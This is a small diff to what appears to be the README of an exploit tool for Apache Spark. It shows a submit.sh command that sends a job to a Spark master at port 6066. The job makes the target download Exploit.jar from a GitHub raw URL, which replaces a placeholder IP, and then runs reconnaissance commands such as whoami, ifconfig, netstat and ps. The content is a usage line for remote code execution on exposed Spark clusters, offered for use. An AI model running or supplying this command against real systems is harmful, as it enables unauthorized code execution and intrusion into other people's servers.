@@ -16,7 +16,7 @@
 ./submit.sh \
 1.1.1.1:6066 \
 2.2.0 \
-http://2.2.2.2/Exploit.jar \
+https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar \
 "whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"
 ```
 
@@ -30,3 +30,5 @@ http://2.2.2.2/Exploit.jar \
 Good Luck!
 
 ![](media/15133243206133.jpg)
+
+
